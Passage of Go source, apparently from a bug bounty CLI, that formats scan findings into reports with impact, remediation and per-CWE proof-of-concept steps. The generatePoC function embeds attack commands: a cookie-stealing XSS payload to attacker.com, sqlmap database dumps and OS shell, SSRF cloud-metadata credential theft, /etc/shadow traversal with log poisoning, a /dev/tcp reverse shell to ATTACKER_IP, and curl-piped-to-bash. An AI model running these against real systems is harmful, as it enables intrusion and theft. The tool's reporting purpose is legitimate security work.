		return "An attacker can read, modify, or delete database contents, potentially leading to full data breach and remote code execution."
	case "CWE-918":
		return "An attacker can make the server perform requests to internal services, potentially exposing cloud credentials (AWS/GCP metadata) and internal infrastructure."
	case "CWE-22":
		return "An attacker can read arbitrary files from the server, including configuration files, credentials, and source code."
	case "CWE-78":
		return "An attacker can execute arbitrary commands on the server with the application's privileges, leading to full system compromise."
	case "CWE-639":
		return "An attacker can access or modify other users' data by manipulating object identifiers, leading to unauthorized data access."
	case "CWE-840":
		return "Business logic flaws allow attackers to bypass intended application workflows, potentially leading to financial loss or unauthorized access."
	default:
		return fmt.Sprintf("This %s vulnerability could allow an attacker to compromise the confidentiality, integrity, or availability of the application.", strings.ToUpper(string(bug.Severity)))
	}
}

func remediationFromCWE(cwe string) string {
	switch cwe {
	case "CWE-79":
		return "1. Encode all user-supplied output using context-aware encoding\n2. Implement Content Security Policy (CSP) headers\n3. Use a modern framework with built-in XSS protection"
	case "CWE-89":
		return "1. Use parameterized queries / prepared statements for all database operations\n2. Apply input validation and allowlisting\n3. Use an ORM with built-in SQL injection protection"
	case "CWE-918":
		return "1. Implement an allowlist of permitted URLs/domains\n2. Block requests to RFC1918 and link-local addresses (169.254.169.254)\n3. Use a sandboxed service for URL fetching"
	case "CWE-22":
		return "1. Validate and sanitize all file path inputs\n2. Use a whitelist of allowed file paths\n3. Run the application with minimal filesystem permissions"
	case "CWE-78":
		return "1. Avoid passing user input to system commands\n2. Use parameterized APIs instead of shell execution\n3. Apply strict input validation and allowlisting"
	case "CWE-639":
		return "1. Implement proper authorization checks for every object access\n2. Use indirect object references (UUIDs instead of sequential IDs)\n3. Validate that the authenticated user owns the requested resource"
	default:
		return "1. Review and fix the root cause of this vulnerability\n2. Apply defense-in-depth security controls\n3. Conduct a security code review of affected components"
	}
}

// AppendPoC adds a PoC section to an existing report file
func AppendPoC(reportPath string, bug Bug, poc string) error {
	f, err := os.OpenFile(reportPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = fmt.Fprintf(f, "\n## PoC — %s\n\n%s\n\n---\n", bug.Title, poc)
	return err
}

// GenerateReportWithPoC creates a report with PoC sections already included
func GenerateReportWithPoC(report BugReport, pocs map[int]string) string {
	var sb strings.Builder

	sb.WriteString("# CyberMind Bug Bounty Report\n\n")
	sb.WriteString(fmt.Sprintf("**Target:** %s\n", report.Target))
	sb.WriteString(fmt.Sprintf("**Scan Date:** %s\n", report.StartTime.Format("2006-01-02 15:04:05")))
	sb.WriteString(fmt.Sprintf("**Duration:** %s\n", report.EndTime.Sub(report.StartTime).Round(time.Second)))
	sb.WriteString(fmt.Sprintf("**Total Findings:** %d\n\n", len(report.Bugs)))

	// Summary
	counts := map[Severity]int{}
	for _, b := range report.Bugs {
		counts[b.Severity]++
	}
	sb.WriteString("## Summary\n\n")
	sb.WriteString("| Severity | Count |\n|----------|-------|\n")
	for _, sev := range []Severity{SeverityCritical, SeverityHigh, SeverityMedium, SeverityLow, SeverityInfo} {
		if counts[sev] > 0 {
			sb.WriteString(fmt.Sprintf("| %s | %d |\n", strings.ToUpper(string(sev)), counts[sev]))
		}
	}
	sb.WriteString("\n")

	// Detailed findings with PoC
	sb.WriteString("## Findings\n\n")
	for i, bug := range report.Bugs {
		sb.WriteString(fmt.Sprintf("### %d. %s\n\n", i+1, bug.Title))
		sb.WriteString(fmt.Sprintf("- **Severity:** %s\n", strings.ToUpper(string(bug.Severity))))
		sb.WriteString(fmt.Sprintf("- **CVSS Score:** %.1f\n", bug.CVSS))
		if bug.CWE != "" {
			sb.WriteString(fmt.Sprintf("- **CWE:** %s\n", bug.CWE))
		}
		if bug.CVE != "" {
			sb.WriteString(fmt.Sprintf("- **CVE:** %s\n", bug.CVE))
		}
		sb.WriteString(fmt.Sprintf("- **Tool:** %s\n", bug.Tool))
		if bug.URL != "" {
			sb.WriteString(fmt.Sprintf("- **URL:** `%s`\n", bug.URL))
		}
		sb.WriteString(fmt.Sprintf("- **Found:** %s\n\n", bug.FoundAt.Format("15:04:05")))

		if bug.Description != "" {
			sb.WriteString(fmt.Sprintf("**Description:**\n%s\n\n", bug.Description))
		}

		if bug.Evidence != "" {
			sb.WriteString("**Evidence:**\n```\n")
			evidence := bug.Evidence
			if len(evidence) > 500 {
				evidence = evidence[:500] + "\n... [truncated]"
			}
			sb.WriteString(evidence)
			sb.WriteString("\n```\n\n")
		}

		// Include PoC if available
		if poc, ok := pocs[i]; ok && poc != "" {
			sb.WriteString("**Proof of Concept:**\n\n")
			sb.WriteString(poc)
			sb.WriteString("\n\n")
		}

		sb.WriteString("---\n\n")
	}

	return sb.String()
}

// ─── World-Class PoC Report Generator ────────────────────────────────────────
// Generates professional, HackerOne-ready PoC reports for all modes.
// File naming: cybermind_<mode>_<target>_<date>.md
// Content: severity, CVSS, impact, step-by-step PoC, curl commands, remediation.

// ModeReport holds all data for a mode-specific report
type ModeReport struct {
	Mode        string    // "recon" | "hunt" | "abhimanyu" | "omega"
	Target      string
	StartTime   time.Time
	EndTime     time.Time
	ToolsRun    []string
	Bugs        []Bug
	Chains      []BugChain
	Subdomains  []string
	LiveURLs    []string
	OpenPorts   []int
	Technologies []string
	JSSecrets   []string
	CloudBuckets []string
	TakeoverCandidates []string
	AIAnalysis  string    // AI-generated analysis text
	RawFindings map[string]string // tool → output
}

// GeneratePoCReport creates a world-class PoC report for any mode.
// This is the main report function — called after every mode completes.
func GeneratePoCReport(r ModeReport) string {
	var sb strings.Builder
	ts := r.StartTime.Format("2006-01-02 15:04:05")
	duration := r.EndTime.Sub(r.StartTime).Round(time.Second)

	// ── Header ────────────────────────────────────────────────────────────
	sb.WriteString("# CyberMind Security Report\n\n")
	sb.WriteString(fmt.Sprintf("**Mode:** %s\n", strings.ToUpper(r.Mode)))
	sb.WriteString(fmt.Sprintf("**Target:** `%s`\n", r.Target))
	sb.WriteString(fmt.Sprintf("**Date:** %s\n", ts))
	sb.WriteString(fmt.Sprintf("**Duration:** %s\n", duration))
	sb.WriteString(fmt.Sprintf("**Tools Run:** %d\n", len(r.ToolsRun)))
	sb.WriteString(fmt.Sprintf("**Generated by:** CyberMind CLI v5.4.0\n\n"))
	sb.WriteString("---\n\n")

	// ── Executive Summary ─────────────────────────────────────────────────
	sb.WriteString("## Executive Summary\n\n")
	critCount, highCount, medCount, lowCount := 0, 0, 0, 0
	for _, b := range r.Bugs {
		switch b.Severity {
		case SeverityCritical:
			critCount++
		case SeverityHigh:
			highCount++
		case SeverityMedium:
			medCount++
		case SeverityLow:
			lowCount++
		}
	}

	// Risk rating
	riskRating := "LOW"
	riskEmoji := "🟢"
	if critCount > 0 {
		riskRating = "CRITICAL"
		riskEmoji = "🔴"
	} else if highCount > 0 {
		riskRating = "HIGH"
		riskEmoji = "🟠"
	} else if medCount > 0 {
		riskRating = "MEDIUM"
		riskEmoji = "🟡"
	}

	sb.WriteString(fmt.Sprintf("**Overall Risk:** %s %s\n\n", riskEmoji, riskRating))
	sb.WriteString("| Severity | Count | Action Required |\n")
	sb.WriteString("|----------|-------|----------------|\n")
	if critCount > 0 {
		sb.WriteString(fmt.Sprintf("| 🔴 CRITICAL | %d | Immediate fix required — report to security team NOW |\n", critCount))
	}
	if highCount > 0 {
		sb.WriteString(fmt.Sprintf("| 🟠 HIGH | %d | Fix within 24-48 hours |\n", highCount))
	}
	if medCount > 0 {
		sb.WriteString(fmt.Sprintf("| 🟡 MEDIUM | %d | Fix within 1 week |\n", medCount))
	}
	if lowCount > 0 {
		sb.WriteString(fmt.Sprintf("| 🟢 LOW | %d | Fix in next release |\n", lowCount))
	}
	if len(r.Bugs) == 0 {
		sb.WriteString("| ✅ NONE | 0 | No vulnerabilities found |\n")
	}
	sb.WriteString("\n")

	// ── Recon Summary (if recon mode) ─────────────────────────────────────
	if r.Mode == "recon" || r.Mode == "omega" {
		sb.WriteString("## Reconnaissance Summary\n\n")
		sb.WriteString(fmt.Sprintf("- **Subdomains discovered:** %d\n", len(r.Subdomains)))
		sb.WriteString(fmt.Sprintf("- **Live URLs:** %d\n", len(r.LiveURLs)))
		sb.WriteString(fmt.Sprintf("- **Open ports:** %v\n", r.OpenPorts))
		sb.WriteString(fmt.Sprintf("- **Technologies:** %s\n", strings.Join(r.Technologies, ", ")))
		if len(r.JSSecrets) > 0 {
			sb.WriteString(fmt.Sprintf("- **🔑 API keys/secrets found:** %d\n", len(r.JSSecrets)))
		}
		if len(r.CloudBuckets) > 0 {
			sb.WriteString(fmt.Sprintf("- **☁️ Cloud buckets exposed:** %d\n", len(r.CloudBuckets)))
		}
		if len(r.TakeoverCandidates) > 0 {
			sb.WriteString(fmt.Sprintf("- **⚠️ Subdomain takeover candidates:** %d\n", len(r.TakeoverCandidates)))
		}
		sb.WriteString("\n")

		// Top subdomains
		if len(r.Subdomains) > 0 {
			sb.WriteString("### Top Subdomains\n\n```\n")
			limit := len(r.Subdomains)
			if limit > 20 {
				limit = 20
			}
			for _, s := range r.Subdomains[:limit] {
				sb.WriteString(s + "\n")
			}
			if len(r.Subdomains) > 20 {
				sb.WriteString(fmt.Sprintf("... and %d more\n", len(r.Subdomains)-20))
			}
			sb.WriteString("```\n\n")
		}
	}

	// ── Exploit Chains ────────────────────────────────────────────────────
	if len(r.Chains) > 0 {
		sb.WriteString("## 🔗 Exploit Chains Detected\n\n")
		sb.WriteString("> **These chains combine multiple vulnerabilities for higher impact**\n\n")
		for i, chain := range r.Chains {
			sb.WriteString(fmt.Sprintf("### Chain %d: %s\n\n", i+1, chain.Title))
			sb.WriteString(fmt.Sprintf("- **Severity:** %s\n", strings.ToUpper(string(chain.Severity))))
			sb.WriteString(fmt.Sprintf("- **Confidence:** %.0f%%\n", chain.Confidence*100))
			sb.WriteString(fmt.Sprintf("- **Impact:** %s\n\n", chain.Impact))
		}
	}

	// ── Vulnerability Details with PoC ────────────────────────────────────
	if len(r.Bugs) > 0 {
		sb.WriteString("## Vulnerability Details\n\n")
		for i, bug := range r.Bugs {
			sb.WriteString(fmt.Sprintf("---\n\n### Finding #%d: %s\n\n", i+1, bug.Title))

			// Severity badge
			sevEmoji := map[Severity]string{
				SeverityCritical: "🔴",
				SeverityHigh:     "🟠",
				SeverityMedium:   "🟡",
				SeverityLow:      "🟢",
				SeverityInfo:     "ℹ️",
			}[bug.Severity]

			sb.WriteString(fmt.Sprintf("| Field | Value |\n|-------|-------|\n"))
			sb.WriteString(fmt.Sprintf("| **Severity** | %s %s |\n", sevEmoji, strings.ToUpper(string(bug.Severity))))
			sb.WriteString(fmt.Sprintf("| **CVSS Score** | %.1f/10 |\n", bug.CVSS))
			if bug.CWE != "" {
				sb.WriteString(fmt.Sprintf("| **CWE** | [%s](https://cwe.mitre.org/data/definitions/%s.html) |\n", bug.CWE, strings.TrimPrefix(bug.CWE, "CWE-")))
			}
			if bug.CVE != "" {
				sb.WriteString(fmt.Sprintf("| **CVE** | [%s](https://nvd.nist.gov/vuln/detail/%s) |\n", bug.CVE, bug.CVE))
			}
			sb.WriteString(fmt.Sprintf("| **Tool** | %s |\n", bug.Tool))
			if bug.URL != "" {
				sb.WriteString(fmt.Sprintf("| **Affected URL** | `%s` |\n", bug.URL))
			}
			sb.WriteString(fmt.Sprintf("| **Confidence** | %.0f%% |\n", bug.Confidence*100))
			sb.WriteString(fmt.Sprintf("| **Found at** | %s |\n\n", bug.FoundAt.Format("15:04:05")))

			// Description
			if bug.Description != "" {
				sb.WriteString(fmt.Sprintf("**Description:**\n%s\n\n", bug.Description))
			}

			// Impact
			sb.WriteString("**Impact:**\n")
			sb.WriteString(impactFromSeverity(bug))
			sb.WriteString("\n\n")

			// Evidence
			if bug.Evidence != "" {
				sb.WriteString("**Evidence (Tool Output):**\n```\n")
				evidence := bug.Evidence
				if len(evidence) > 800 {
					evidence = evidence[:800] + "\n... [truncated — see raw output file]"
				}
				sb.WriteString(evidence)
				sb.WriteString("\n```\n\n")
			}

			// PoC — step by step
			sb.WriteString("**Proof of Concept (PoC):**\n\n")
			sb.WriteString(generatePoC(bug))
			sb.WriteString("\n")

			// What can happen
			sb.WriteString("**What an attacker can do:**\n")
			sb.WriteString(attackerImpact(bug))
			sb.WriteString("\n\n")

			// What to do next (for the bug bounty hunter)
			sb.WriteString("**Next Steps for Bug Bounty Hunter:**\n")
			sb.WriteString(nextStepsForHunter(bug))
			sb.WriteString("\n\n")

			// Remediation
			sb.WriteString("**Remediation:**\n")
			sb.WriteString(remediationFromCWE(bug.CWE))
			sb.WriteString("\n\n")
		}
	}

	// ── AI Analysis ───────────────────────────────────────────────────────
	if r.AIAnalysis != "" {
		sb.WriteString("---\n\n## AI Security Analysis\n\n")
		sb.WriteString(r.AIAnalysis)
		sb.WriteString("\n\n")
	}

	// ── Tools Run ─────────────────────────────────────────────────────────
	if len(r.ToolsRun) > 0 {
		sb.WriteString("---\n\n## Tools Executed\n\n```\n")
		for _, t := range r.ToolsRun {
			sb.WriteString(t + "\n")
		}
		sb.WriteString("```\n\n")
	}

	sb.WriteString("---\n\n*Report generated by CyberMind CLI v5.4.0 — AI-powered bug bounty platform*\n")
	sb.WriteString("*https://cybermindcli1.vercel.app*\n")

	return sb.String()
}

// generatePoC creates step-by-step PoC for a bug
func generatePoC(bug Bug) string {
	var sb strings.Builder
	url := bug.URL
	if url == "" {
		url = bug.Target
	}
	if !strings.HasPrefix(url, "http") {
		url = "https://" + url
	}

	switch bug.CWE {
	case "CWE-79": // XSS
		sb.WriteString("```bash\n")
		sb.WriteString("# Step 1: Identify the vulnerable parameter\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s' | grep -i 'script\\|onerror\\|onload'\n\n", url))
		sb.WriteString("# Step 2: Test basic XSS payload\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?q=<script>alert(1)</script>'\n\n", url))
		sb.WriteString("# Step 3: Confirm with dalfox\n")
		sb.WriteString(fmt.Sprintf("dalfox url '%s' --silence\n\n", url))
		sb.WriteString("# Step 4: Craft session-stealing payload\n")
		sb.WriteString(fmt.Sprintf("# Payload: <script>document.location='https://attacker.com/steal?c='+document.cookie</script>\n"))
		sb.WriteString("```\n")

	case "CWE-89": // SQLi
		sb.WriteString("```bash\n")
		sb.WriteString("# Step 1: Confirm injection point\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s' -d \"id=1'\" | grep -i 'error\\|sql\\|syntax'\n\n", url))
		sb.WriteString("# Step 2: Run sqlmap to confirm\n")
		sb.WriteString(fmt.Sprintf("sqlmap -u '%s' --batch --level 3 --risk 2 --dbs\n\n", url))
		sb.WriteString("# Step 3: Dump database\n")
		sb.WriteString(fmt.Sprintf("sqlmap -u '%s' --batch --dump-all --threads 5\n\n", url))
		sb.WriteString("# Step 4: Try OS shell (if MySQL + FILE privilege)\n")
		sb.WriteString(fmt.Sprintf("sqlmap -u '%s' --batch --os-shell\n", url))
		sb.WriteString("```\n")

	case "CWE-918": // SSRF
		sb.WriteString("```bash\n")
		sb.WriteString("# Step 1: Test with internal IP\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?url=http://169.254.169.254/latest/meta-data/'\n\n", url))
		sb.WriteString("# Step 2: Test cloud metadata\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'\n\n", url))
		sb.WriteString("# Step 3: Test with interactsh for OOB confirmation\n")
		sb.WriteString("# Start interactsh: interactsh-client\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?url=http://YOUR_INTERACTSH_URL'\n\n", url))
		sb.WriteString("# Step 4: If AWS metadata accessible, get IAM credentials\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME'\n", url))
		sb.WriteString("```\n")

	case "CWE-22": // LFI
		sb.WriteString("```bash\n")
		sb.WriteString("# Step 1: Test basic path traversal\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?file=../../../etc/passwd'\n\n", url))
		sb.WriteString("# Step 2: Test with encoding bypass\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?file=..%%2F..%%2F..%%2Fetc%%2Fpasswd'\n\n", url))
		sb.WriteString("# Step 3: Read sensitive files\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?file=../../../etc/shadow'\n", url))
		sb.WriteString(fmt.Sprintf("curl -s '%s?file=../../../var/www/html/config.php'\n\n", url))
		sb.WriteString("# Step 4: Try log poisoning for RCE\n")
		sb.WriteString(fmt.Sprintf("curl -s -H 'User-Agent: <?php system($_GET[cmd]); ?>' '%s'\n", url))
		sb.WriteString(fmt.Sprintf("curl -s '%s?file=../../../var/log/apache2/access.log&cmd=id'\n", url))
		sb.WriteString("```\n")

	case "CWE-78": // RCE
		sb.WriteString("```bash\n")
		sb.WriteString("# Step 1: Confirm command execution\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?cmd=id'\n\n", url))
		sb.WriteString("# Step 2: Get reverse shell\n")
		sb.WriteString("# Start listener: nc -lvnp 4444\n")
		sb.WriteString(fmt.Sprintf("curl -s '%s?cmd=bash%%20-i%%20>%%26%%20/dev/tcp/ATTACKER_IP/4444%%200>%%261'\n\n", url))
		sb.WriteString("# Step 3: Stabilize shell\n")
		sb.WriteString("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n")
		sb.WriteString("# Step 4: Privilege escalation\n")
		sb.WriteString("curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash\n")
		sb.WriteString("```\n")

	case "CWE-639": // IDOR
		sb.WriteString("```bash\n")
		sb.WriteString("# Step 1: Identify the object ID in the URL/body\n")
		sb.WriteString(fmt.Sprintf("# Example: %s?user_id=12345\n\n", url))
		sb.WriteString("# Step 2: Change ID to another user's ID\n")
		sb.WriteString(fmt.Sprintf("curl -s -H 'Authorization: Bearer YOUR_TOKEN' '%s?user_id=12346'\n\n", url))
		sb.WriteString("# Step 3: Try sequential IDs\n")
		sb.WriteString(fmt.Sprintf("for i in $(seq 1 100); do curl -s -H 'Authorization: Bearer YOUR_TOKEN' '%s?user_id=$i' | grep -i 'email\\|name\\|phone'; done\n\n", url))
		sb.WriteString("# Step 4: Try UUID prediction (if UUIDs used)\n")
		sb.WriteString("# Use uuid-tool to predict sequential UUIDs\n")
		sb.WriteString("# Step 5: Try object reference in headers\n")
		sb.WriteString(fmt.Sprintf("curl -s -H 'X-User-ID: 1' -H 'X-Account-ID: 1' '%s'\n", url))
		sb.WriteString("```\n")

	case "CWE-840": // Business Logic
		sb.WriteString("```bash\n")
		sb.WriteString("# Step 1: Test negative price/quantity\n")
		sb.WriteString(fmt.Sprintf("curl -s -X POST '%s' -H 'Content-Type: application/json' -d '{\"price\": -100, \"quantity\": -1}'\n\n", url))
		sb.WriteString("# Step 2: Test race condition (concurrent requests)\n")
		sb.WriteString("# Use Turbo Intruder or:\n")
		sb.WriteString(fmt.Sprintf("for i in $(seq 1 20); do curl -s -X POST '%s' -d 'coupon=SAVE50' & done; wait\n\n", url))
		sb.WriteString("# Step 3: Test workflow bypass\n")
		sb.WriteString("# Skip payment step by directly calling order confirmation endpoint\n")
		sb.WriteString(fmt.Sprintf("curl -s -X POST '%s/confirm' -H 'Authorization: Bearer TOKEN' -d '{\"order_id\": 123}'\n", url))
		sb.WriteString("```\n")

	default:
		sb.WriteString("```bash\n")
		sb.WriteString(fmt.Sprintf("# Target: %s\n", url))
		sb.WriteString("# Tool: " + bug.Tool + "\n\n")
		sb.WriteString("# Step 1: Reproduce the finding\n")
		sb.WriteString(fmt.Sprintf("curl -v '%s'\n\n", url))
		sb.WriteString("# Step 2: Verify with nuclei\n")
		sb.WriteString(fmt.Sprintf("nuclei -u '%s' -severity critical,high -silent\n\n", url))
		sb.WriteString("# Step 3: Document evidence\n")
		sb.WriteString("# Screenshot the response showing the vulnerability\n")
		sb.WriteString("```\n")
	}
	return sb.String()
}

// attackerImpact describes what an attacker can do with this bug
func attackerImpact(bug Bug) string {
	switch bug.CWE {
	case "CWE-79":
		return "- Steal session cookies → account takeover\n- Redirect users to phishing pages\n- Keylog user input\n- Perform actions on behalf of victim\n- Spread worm-like XSS to other users\n"
	case "CWE-89":
		return "- Read entire database (usernames, passwords, PII)\n- Modify or delete database records\n- Bypass authentication\n- Potentially achieve RCE via INTO OUTFILE or xp_cmdshell\n- Exfiltrate sensitive business data\n"
	case "CWE-918":
		return "- Access internal services (Redis, Memcached, internal APIs)\n- Read AWS/GCP/Azure metadata → steal IAM credentials\n- Scan internal network\n- Potentially achieve RCE via internal service exploitation\n- Bypass IP-based access controls\n"
	case "CWE-22":
		return "- Read /etc/passwd, /etc/shadow (password hashes)\n- Read application source code and config files\n- Read database credentials from config files\n- Potentially achieve RCE via log poisoning\n- Read SSH private keys\n"
	case "CWE-78":
		return "- Execute arbitrary commands on the server\n- Get reverse shell → full server compromise\n- Read/modify/delete any file\n- Pivot to internal network\n- Install backdoors for persistent access\n- Exfiltrate all data\n"
	case "CWE-639":
		return "- Access other users' personal data (PII)\n- Modify other users' account settings\n- Read private messages/files of other users\n- Escalate privileges by accessing admin objects\n- Mass data exfiltration of all user records\n"
	case "CWE-840":
		return "- Get products/services for free or at negative price\n- Reuse discount coupons unlimited times\n- Double-spend credits/balance\n- Bypass payment verification\n- Financial loss for the organization\n"
	default:
		return "- Potential security impact depending on context\n- Verify manually to determine full impact\n"
	}
}

// nextStepsForHunter tells the bug bounty hunter what to do next
func nextStepsForHunter(bug Bug) string {
	var sb strings.Builder
	sb.WriteString("```\n")
	switch bug.Severity {
	case SeverityCritical:
		sb.WriteString("1. STOP — Do NOT exploit further (stay in scope)\n")
		sb.WriteString("2. Document: screenshot + curl command + response\n")
		sb.WriteString("3. Write HackerOne report immediately\n")
		sb.WriteString("4. Title format: [CRITICAL] <VulnType> on <target>\n")
		sb.WriteString("5. Include: steps to reproduce, impact, PoC curl command\n")
		sb.WriteString("6. Submit to program — expect $1000-$50000 payout\n")
		sb.WriteString("7. Wait for triage (usually 24-72 hours)\n")
	case SeverityHigh:
		sb.WriteString("1. Verify the finding manually (confirm it's real)\n")
		sb.WriteString("2. Document: screenshot + curl command + response\n")
		sb.WriteString("3. Check if it affects multiple endpoints\n")
		sb.WriteString("4. Write HackerOne report\n")
		sb.WriteString("5. Title format: [HIGH] <VulnType> on <target>\n")
		sb.WriteString("6. Include: steps to reproduce, impact, PoC\n")
		sb.WriteString("7. Submit — expect $200-$5000 payout\n")
	case SeverityMedium:
		sb.WriteString("1. Verify the finding manually\n")
		sb.WriteString("2. Check if it can be chained with other bugs for higher impact\n")
		sb.WriteString("3. Document with screenshots\n")
		sb.WriteString("4. Write report — title: [MEDIUM] <VulnType> on <target>\n")
		sb.WriteString("5. Submit — expect $50-$500 payout\n")
	default:
		sb.WriteString("1. Verify manually\n")
		sb.WriteString("2. Check if it can be chained for higher impact\n")
		sb.WriteString("3. Document and submit if in scope\n")
	}
	sb.WriteString("```\n")
	return sb.String()
}

// SaveModeReport saves a PoC report to the correct location with proper naming
// Returns the saved file path
func SaveModeReport(r ModeReport) string {
	content := GeneratePoCReport(r)

	// File naming: cybermind_<mode>_<target>_<date>.md
	safeTarget := strings.NewReplacer(".", "_", "/", "_", ":", "_", " ", "_").Replace(r.Target)
	ts := r.StartTime.Format("2006-01-02_15-04-05")
	filename := fmt.Sprintf("cybermind_%s_%s_%s.md", r.Mode, safeTarget, ts)

	// Save locations: Desktop → Downloads → ~/.cybermind/reports
	home, _ := os.UserHomeDir()
	savePaths := []string{
		filepath.Join(home, "Desktop", filename),
		filepath.Join(home, "Downloads", filename),
		filepath.Join(home, ".cybermind", "reports", filename),
	}

	for _, path := range savePaths {
		dir := filepath.Dir(path)
		if err := os.MkdirAll(dir, 0700); err != nil {
			continue
		}
		if err := os.WriteFile(path, []byte(content), 0644); err == nil {
			return path
		}
	}

	// Fallback: current directory
	if err := os.WriteFile(filename, []byte(content), 0644); err == nil {
		return filename
	}
	return ""
}
